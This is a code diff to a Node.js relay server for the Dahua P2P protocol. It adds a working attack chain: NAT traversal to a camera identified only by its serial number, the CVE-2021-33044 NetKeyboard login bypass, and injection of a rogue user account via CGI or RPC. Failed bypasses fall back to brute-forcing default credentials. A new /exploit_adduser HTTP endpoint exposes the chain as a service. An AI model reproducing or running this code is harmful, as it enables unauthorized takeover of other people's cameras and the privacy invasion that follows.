@@ -1,6 +1,6 @@
 #!/usr/bin/env node
 /**
- * Dahua P2P Tunnel Relay Server v2.0
+ * Dahua P2P Tunnel Relay Server v3.0
  * ===================================
  * Implements the full Dahua P2P protocol:
  *   - P2P handshake (UDP to easy4ipcloud.com:8800)
@@ -703,6 +703,101 @@ async function checkP2P(serial) {
   });
 }
 
+
+// ── Bind Tunnel Port Helper ──
+async function bindTunnelPort(deviceSock, targetPort) {
+  var realmId = crypto.randomBytes(4).readUInt32BE(0);
+  var realmBuf = Buffer.alloc(4);
+  realmBuf.writeUInt32BE(realmId, 0);
+  var portBuf = Buffer.alloc(4);
+  portBuf.writeUInt32BE(targetPort, 0);
+  var bindBody = Buffer.concat([Buffer.from([0x11, 0x00, 0x00, 0x00]), realmBuf, Buffer.alloc(4), portBuf, Buffer.from([0x7f, 0x00, 0x00, 0x01])]);
+  await deviceSock.requestPTCP(bindBody);
+  var bRes = await deviceSock.readPTCP();
+  if (bRes.body.length === 0) bRes = await deviceSock.readPTCP();
+  return realmId;
+}
+
+// ── CVE-2021-33044 Login Bypass (NetKeyboard) ──
+async function exploitLoginBypass(deviceSock, targetPort) {
+  var detail = [];
+  var loginPayload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', password: '', clientType: 'NetKeyboard', loginType: 'Direct', authorityType: 'Default' }, id: 1, session: 0 });
+  var realmId = await bindTunnelPort(deviceSock, targetPort);
+  var loginRes = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2_Login', 'POST', {'Content-Type':'application/json'}, loginPayload);
+  detail.push('Login bypass HTTP ' + loginRes.status);
+  if (loginRes.status !== 200) return { success: false, detail: detail, error: 'HTTP ' + loginRes.status };
+  var loginData;
+  try { loginData = JSON.parse(loginRes.body); } catch(e) { return { success: false, detail: detail, error: 'Invalid JSON: ' + loginRes.body.substring(0, 100) }; }
+  if (loginData.result === true) { detail.push('Bypass successful (single step)'); return { success: true, detail: detail, session: String(loginData.session) }; }
+  if (loginData.error && loginData.params) {
+    var random = loginData.params.random || '';
+    var realm = loginData.params.realm || '';
+    var tempSession = String(loginData.session || '');
+    detail.push('Got challenge: realm=' + realm + ', random=' + random);
+    var hash1 = crypto.createHash('md5').update('admin:' + realm + ':admin').digest('hex').toUpperCase();
+    var hash2 = crypto.createHash('md5').update('admin:' + random + ':' + hash1).digest('hex').toUpperCase();
+    var step2Payload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', password: hash2, clientType: 'NetKeyboard', loginType: 'Direct', authorityType: 'Default' }, id: 2, session: tempSession });
+    realmId = await bindTunnelPort(deviceSock, targetPort);
+    var step2Res = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2_Login', 'POST', {'Content-Type':'application/json'}, step2Payload);
+    detail.push('Step 2 HTTP ' + step2Res.status);
+    if (step2Res.status === 200) { try { var step2Data = JSON.parse(step2Res.body); if (step2Data.result === true) { detail.push('Bypass successful (two step)'); return { success: true, detail: detail, session: String(step2Data.session) }; } detail.push('Step 2 error: ' + (step2Data.error ? JSON.stringify(step2Data.error) : 'no result')); } catch(e) { detail.push('Step 2 parse error: ' + step2Res.body.substring(0, 100)); } }
+  }
+  return { success: false, detail: detail, error: 'Bypass did not return session' };
+}
+
+// ── Exploit Add User (full chain) ──
+async function exploitAddUser(serial, newUser, newPass, targetPort) {
+  var allSteps = [];
+  targetPort = targetPort || 80;
+  allSteps.push({ step: 'p2p', status: 'running', message: 'Consultando P2P cloud...' });
+  var p2pStatus = await checkP2P(serial);
+  if (!p2pStatus.online) { allSteps.push({ step: 'p2p', status: 'failed', message: 'Dispositivo OFFLINE (' + (p2pStatus.error || 'not registered') + ')' }); return { success: false, steps: allSteps }; }
+  allSteps.push({ step: 'p2p', status: 'done', message: 'Dispositivo ONLINE — US: ' + p2pStatus.relay });
+  allSteps.push({ step: 'tunnel', status: 'running', message: 'Estableciendo tunel PTCP...' });
+  var tunnel = null;
+  try { tunnel = await establishTunnel(serial, null, null, targetPort); allSteps.push({ step: 'tunnel', status: 'done', message: 'Tunel P2P establecido (NAT traversal OK)' }); } catch (err) { allSteps.push({ step: 'tunnel', status: 'failed', message: 'Tunel fallo: ' + err.message }); return { success: false, steps: allSteps }; }
+  try {
+    allSteps.push({ step: 'exploit', status: 'running', message: 'Ejecutando CVE-2021-33044 (NetKeyboard bypass)...' });
+    var loginResult = await exploitLoginBypass(tunnel.deviceSock, targetPort);
+    for (var i = 0; i < loginResult.detail.length; i++) allSteps.push({ step: 'exploit_detail', message: loginResult.detail[i] });
+    if (loginResult.success) {
+      allSteps.push({ step: 'exploit', status: 'done', message: 'Autenticacion bypassed! Session: ' + loginResult.session.substring(0, 16) + '...' });
+      allSteps.push({ step: 'adduser', status: 'running', message: 'Inyectando usuario "' + newUser + '" via CGI...' });
+      var realmId = await bindTunnelPort(tunnel.deviceSock, targetPort);
+      var cgiPath = '/cgi-bin/userManager.cgi?action=addUser&user.Name=' + encodeURIComponent(newUser) + '&user.Password=' + encodeURIComponent(newPass) + '&user.Group=user&user.Sharable=true&user.Reserved=false';
+      var addRes = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, cgiPath, 'GET', {Cookie: 'DHSession=' + loginResult.session}, '');
+      if (addRes.status === 200 && addRes.body.trim().toLowerCase() === 'ok') { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario "' + newUser + '" agregado exitosamente!' }); return { success: true, steps: allSteps }; }
+      allSteps.push({ step: 'adduser', status: 'running', message: 'CGI retorno HTTP ' + addRes.status + ', intentando RPC...' });
+      realmId = await bindTunnelPort(tunnel.deviceSock, targetPort);
+      var rpcPayload = JSON.stringify({ method: 'userManager.addUser', params: { Name: newUser, Password: newPass, Group: 'user', Sharable: true, Reserved: false }, id: 3, session: loginResult.session });
+      var rpcRes = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, rpcPayload);
+      if (rpcRes.status === 200) { try { var rpcData = JSON.parse(rpcRes.body); if (rpcData.result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario "' + newUser + '" agregado via RPC!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
+      allSteps.push({ step: 'adduser', status: 'failed', message: 'Fallo: HTTP ' + addRes.status + ' / ' + (addRes.body || '').substring(0, 100) });
+      return { success: false, steps: allSteps };
+    } else {
+      allSteps.push({ step: 'exploit', status: 'failed', message: loginResult.error });
+      allSteps.push({ step: 'fallback', status: 'running', message: 'Intentando credenciales por defecto...' });
+      try { tunnel.deviceSock.close(); tunnel.mainSock.close(); } catch(e) {}
+      var defaultCreds = [{ user: 'admin', pass: 'admin' }, { user: 'admin', pass: '12345' }, { user: 'admin', pass: '888888' }, { user: 'admin', pass: '' }, { user: 'admin', pass: 'password' }];
+      for (var ci = 0; ci < defaultCreds.length; ci++) {
+        var cred = defaultCreds[ci];
+        try {
+          var ftunnel = await establishTunnel(serial, cred.user, cred.pass, targetPort);
+          var frealmId = await bindTunnelPort(ftunnel.deviceSock, targetPort);
+          var fcgiPath = '/cgi-bin/userManager.cgi?action=addUser&user.Name=' + encodeURIComponent(newUser) + '&user.Password=' + encodeURIComponent(newPass) + '&user.Group=user&user.Sharable=true&user.Reserved=false';
+          var faddRes = await sendHTTPThroughTunnel(ftunnel.deviceSock, frealmId, fcgiPath, 'GET', {}, '');
+          if (faddRes.status === 401) { var fwwwAuth = faddRes.headers['WWW-Authenticate'] || faddRes.headers['www-authenticate']; if (fwwwAuth) { var fdp = parseDigestAuth(fwwwAuth); var fauthHeader = buildDigestAuth('GET', fcgiPath, fdp, cred.user, cred.pass); frealmId = await bindTunnelPort(ftunnel.deviceSock, targetPort); faddRes = await sendHTTPThroughTunnel(ftunnel.deviceSock, frealmId, fcgiPath, 'GET', {Authorization: fauthHeader}, ''); } }
+          try { ftunnel.deviceSock.close(); ftunnel.mainSock.close(); } catch(e) {}
+          if (faddRes.status === 200 && faddRes.body.trim().toLowerCase() === 'ok') { allSteps.push({ step: 'fallback', status: 'done', message: 'Usuario agregado con creds: ' + cred.user + '/' + (cred.pass || '(empty)') }); return { success: true, steps: allSteps, credentials: cred }; }
+          allSteps.push({ step: 'fallback_detail', message: 'Creds ' + cred.user + '/' + (cred.pass || '(empty)') + ' fallo (HTTP ' + faddRes.status + ')' });
+        } catch(e) { allSteps.push({ step: 'fallback_detail', message: 'Creds ' + cred.user + '/' + (cred.pass || '(empty)') + ' fallo (' + e.message + ')' }); }
+      }
+      allSteps.push({ step: 'fallback', status: 'failed', message: 'Todas las credenciales fallaron' });
+      return { success: false, steps: allSteps };
+    }
+  } finally { if (tunnel) { try { tunnel.deviceSock.close(); } catch(e) {} try { tunnel.mainSock.close(); } catch(e) {} } }
+}
+
 // ── HTTP Server ──
 function readBody(req) {
   return new Promise(function(resolve) {
@@ -720,7 +815,7 @@ var server = http.createServer(async function(req, res) {
 
   if (req.url === '/health') {
     res.writeHead(200, { 'Content-Type': 'application/json' });
-    return res.end(JSON.stringify({ status: 'ok', version: '2.1', features: ['status', 'tunnel', 'cgi', 'debug'] }));
+    return res.end(JSON.stringify({ status: 'ok', version: '3.0', features: ['status', 'tunnel', 'cgi', 'debug'] }));
   }
 
   // Debug endpoint - tests each step of tunnel establishment
@@ -858,6 +953,23 @@ var server = http.createServer(async function(req, res) {
     }
   }
 
+
+  // Exploit endpoint - CVE-2021-33044 user injection
+  if (req.url === '/exploit_adduser' && req.method === 'POST') {
+    var exploitBody = await readBody(req);
+    try {
+      var exploitParams = JSON.parse(exploitBody);
+      if (!exploitParams.serial || exploitParams.serial.length < 10) { res.writeHead(400, {'Content-Type':'application/json'}); return res.end(JSON.stringify({error:'Serial must be at least 10 characters'})); }
+      if (!exploitParams.new_user || !exploitParams.new_pass) { res.writeHead(400, {'Content-Type':'application/json'}); return res.end(JSON.stringify({error:'new_user and new_pass are required'})); }
+      var exploitResult = await exploitAddUser(exploitParams.serial, exploitParams.new_user, exploitParams.new_pass, exploitParams.target_port || 80);
+      res.writeHead(200, {'Content-Type':'application/json'});
+      return res.end(JSON.stringify(exploitResult));
+    } catch (exploitErr) {
+      res.writeHead(500, {'Content-Type':'application/json'});
+      return res.end(JSON.stringify({error: exploitErr.message}));
+    }
+  }
+
   res.writeHead(404, { 'Content-Type': 'application/json' });
   res.end(JSON.stringify({ error: 'Not found. Use GET /:serial or POST /tunnel' }));
 });
@@ -879,7 +991,7 @@ server.on('error', function(err) {
 });
 
 server.listen(PORT, function() {
-  console.log('Dahua P2P Tunnel Relay v2.1 running on port ' + PORT);
+  console.log('Dahua P2P Tunnel Relay v3.0 running on port ' + PORT);
   console.log('Endpoints:');
   console.log('  GET  /health      - Health check');
   console.log('  GET  /debug/:sn   - Debug tunnel steps');
